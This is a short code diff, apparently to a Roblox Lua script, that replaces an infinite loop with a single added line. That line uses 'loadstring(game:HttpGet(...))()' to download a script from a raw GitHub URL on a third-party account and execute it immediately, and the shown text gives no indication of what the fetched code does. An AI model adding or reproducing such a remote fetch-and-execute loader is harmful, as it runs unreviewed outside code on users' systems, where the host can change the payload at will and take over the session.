@@ -6,4 +6,5 @@
     Duration = 3;
   })
   
-  while true do end
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/mkzu/for-my-amigos/main/heheheha"))()
+    
